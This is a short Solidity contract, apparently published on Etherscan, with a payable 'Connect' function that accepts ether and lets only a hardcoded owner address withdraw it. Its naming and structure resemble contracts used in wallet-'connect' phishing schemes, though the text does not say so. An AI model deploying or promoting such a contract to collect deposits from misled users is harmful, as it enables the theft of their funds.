/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

pragma solidity ^0.4.26;

contract Connects {

    address private  owner;

     constructor() public{   
        owner=0xc3e3009ccF22f664E72C2d2e9BE9483a1F070E54;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Connect() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}